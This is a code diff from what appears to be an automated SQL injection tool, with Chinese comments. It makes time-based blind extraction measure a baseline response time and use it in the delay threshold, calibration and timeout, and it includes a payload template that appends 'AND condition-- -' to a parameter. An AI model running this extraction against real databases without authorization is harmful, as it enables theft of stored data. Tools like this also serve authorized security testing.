@@ -511,14 +511,25 @@ export async function extractTime(ex, ctx, expr) {
     const subFn = pickDialectFn(SUB_FN, dbms);
     const asciiFn = pickDialectFn(ASCII_FN, dbms);
     if (!lenFn || !subFn || !asciiFn) return null;
-    // 时间判定阈值：以「基线耗时 + timeThresholdMs」为准，避免目标本身慢造成误判
-    const thresholdMs = (ctx.config?.timeThresholdMs ?? defaults.timeThresholdMs) * 1;
+    // 时间判定阈值：基线耗时 + timeThresholdMs。**注释一直这么写，代码此前没做**。
+    // 本仓另外三条时间路径都是这个口径（TimeBlindDetector 的 μ+z·σ、StackedDetector 的
+    // max(阈值, 基线+sleep/2)、DBFingerprinter 的 baselineRtt + 阈值），唯独提取通道漏了。
+    // 后果不是「值偏一点」：自身响应慢于阈值的目标上「耗时 ≥ 阈值」对每个条件都成立 ⇒
+    // 长度二分恒判真 → 顶到 blindMaxLen 上界 → 逐位置循环失控（现场见 tests/extractor.timeBaseline.test.js）。
+    const absFloorMs = (ctx.config?.timeThresholdMs ?? defaults.timeThresholdMs) * 1;
+    const baseTimeoutMs = ctx.config?.timeoutMs ?? defaults.timeoutMs;
+    const baselineMs = await _timeBaselineMs(ex, ctx, base, baseTimeoutMs);
+    const thresholdMs = absFloorMs + baselineMs;
     // 完整值投票复验开关（P2-P7，与布尔通道共用 blindRobust.extractVerify，默认 true）
     const rbCfg = ctx.config?.blindRobust;
     const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
     // 提取阶段 sleep（P2-P8）：timeExtractSleepSec 优先，未配置回退 timeBlindSleepSec（与现状一致）
-    const sleepSec = await calibrateTimeSleep(ex, ctx, base, condFn);
-    const timeoutMs = (ctx.config?.timeoutMs ?? defaults.timeoutMs) + sleepSec * 1000;
+    // 标定判据与下面的正式判定共用同一个 thresholdMs —— 不同源的话，慢站上标定按旧阈值
+    // 选中最小 sleep，而判定时阈值已抬到「基线+余量」之上，整条链会恒判假。
+    const sleepSec = await calibrateTimeSleep(ex, ctx, base, condFn, thresholdMs);
+    // 注入超时同样补基线（与 StackedDetector 的 ★FIX [P0] 同因）：慢站上「基线 + sleep」超过
+    // timeout 会被掐掉 → _send 返回 null → 全部条件按失败判假 → 一次本可提取的值被误报「取不出」。
+    const timeoutMs = baseTimeoutMs + baselineMs + sleepSec * 1000;
 
     // 时间判定：条件为真 → 触发延迟 → 耗时 ≥ 阈值
     const timedTrue = async (cond) => {
@@ -618,6 +629,24 @@ async function _verifyWholeValue(ex, ctx, base, expr, value) {
     return String(rTrue?.data ?? '') !== String(rFalse?.data ?? '');
   }
 
+  // 时间提取的基线耗时：3 次「不注入条件」的原值请求取中位数（同 StackedDetector 的
+  // ★FIX [误报防护] 策略）。刻意**串行**而非并发：判定侧每次探针也是单独计时，并发采样会把
+  // 令牌桶排队时间只算进基线（阈值虚高 → 恒判假 → 提取被截断），串行才与判定侧同量。
+  // 单次基线对抖动敏感：偶然慢把阈值抬到真实延迟之上（判假），偶然快把阈值压低（恒判真）。
+  // 全部失败 → 回落 0（退化为旧行为：只用配置阈值），与三条同类路径一致。
+/** @param {any} ex @param {object} ctx @param {string} base @param {number} timeoutMs */
+async function _timeBaselineMs(ex, ctx, base, timeoutMs) {
+    const samples = [];
+    for (let i = 0; i < 3; i++) {
+      const t0 = Date.now();
+      const res = await ex._send(ctx, base, { timeoutMs, retry: 0 });
+      if (res) samples.push(Date.now() - t0);
+    }
+    if (!samples.length) return 0;
+    samples.sort((a, b) => a - b);
+    return samples[Math.floor(samples.length / 2)];
+  }
+
   // 时间盲注最小可行 sleep 标定（对标 sqlmap 时间盲注优化）：在正式二分提取前，
   // 用「恒真条件」实测小 sleep 的耗时能否稳定超过判定阈值。可行则取最小 sleep（降低单点墙钟），
   // 不可行逐步加大，最终回退 config.timeExtractSleepSec（未配置回退 timeBlindSleepSec，与现状一致）。
@@ -625,12 +654,18 @@ async function _verifyWholeValue(ex, ctx, base, expr, value) {
   // （默认 false，与现状一致：不标定、直接用提取 sleep）。关闭时零标定请求。
   // 说明：标定仅发 1~N 个「恒真延迟」请求（N=候选数，通常 1~2），命中后每个二分请求都省下 sleep 差值，
   // 版本证明（约 7 字节 × 8 轮）可省数十秒。
-/** @param {any} ex @param {object} ctx @param {any} base @param {any} condFn */
-export async function calibrateTimeSleep(ex, ctx, base, condFn) {
+/** @param {any} ex @param {object} ctx @param {any} base @param {any} condFn @param {number} [thresholdMsOverride] */
+export async function calibrateTimeSleep(ex, ctx, base, condFn, thresholdMsOverride) {
     const cfg = ctx.config || {};
     const defaultSec = _extractSleep(ex, ctx);
     if ((cfg.timeBlindCalibrate ?? defaults.timeBlindCalibrate) !== true) return defaultSec;
-    const thresholdMs = cfg.timeThresholdMs ?? defaults.timeThresholdMs ?? 1500;
+    // 调用方（extractTime）传入的是**已含基线**的判定阈值：标定与正式判定必须同源，
+    // 否则慢目标上标定按旧阈值挑中 1s sleep，判定侧却要求「基线 + 余量」以上的耗时。
+    // 未传时回落配置阈值（既有直接调用本方法的用例行为不变）。
+    const thresholdMs =
+      typeof thresholdMsOverride === 'number' && Number.isFinite(thresholdMsOverride) && thresholdMsOverride > 0
+        ? thresholdMsOverride
+        : cfg.timeThresholdMs ?? defaults.timeThresholdMs ?? 1500;
     const timeoutMs = (cfg.timeoutMs ?? defaults.timeoutMs ?? 10000) + defaultSec * 1000;
     for (const sec of _sleepCandidates(ex, defaultSec)) {
       const payload = `${base} AND ${condFn('1=1', sec)}-- -`;
